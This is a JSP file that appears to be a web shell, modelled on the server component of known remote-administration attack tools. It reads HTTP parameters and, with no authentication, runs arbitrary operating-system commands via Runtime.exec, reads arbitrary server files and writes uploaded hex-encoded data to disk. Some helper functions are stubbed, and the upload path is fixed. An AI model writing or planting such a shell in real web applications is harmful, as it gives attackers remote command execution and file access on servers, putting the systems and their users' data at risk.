<%@ page import="java.io.*" %>
<%!
String EC(String s) { return s; }
String decode(String s, String mode) { return s; }
boolean isWin() { return System.getProperty("os.name").startsWith("Windows"); }
String ExecuteCommandCode(String cmdPath, String command) throws Exception {
    String[] c = { cmdPath, !isWin() ? "-c" : "/c", command };
    Process p = Runtime.getRuntime().exec(c);
    return new String(p.getInputStream().readAllBytes());
}
String ReadFileCode(String filePath) throws Exception {
    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(filePath))));
    return br.readLine();
}
String UploadFileCode(String savefilePath, String fileHexContext) throws Exception {
    String h = "0123456789ABCDEF";
    File f = new File("/tmp/fixed-upload");
    FileOutputStream os = new FileOutputStream(f,true);
    for (int i = 0; i < fileHexContext.length(); i += 2) {
        os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
    }
    os.close();
    return "1";
}
%>
<%
String encoder = "";
String z0 = "";
String z1 = EC(decode(request.getParameter("z1")+"", encoder));
String z2 = EC(decode(request.getParameter("z2")+"", encoder));
String z3 = "";
String[] pars = { z0, z1, z2, z3};
String action = request.getParameter("action");
String result = "";
if ("command".equals(action)) result = ExecuteCommandCode(pars[1], pars[2]);
if ("read".equals(action)) result = ReadFileCode(pars[1]);
if ("upload".equals(action)) result = UploadFileCode(pars[1], pars[2]);
out.print(result);
%>
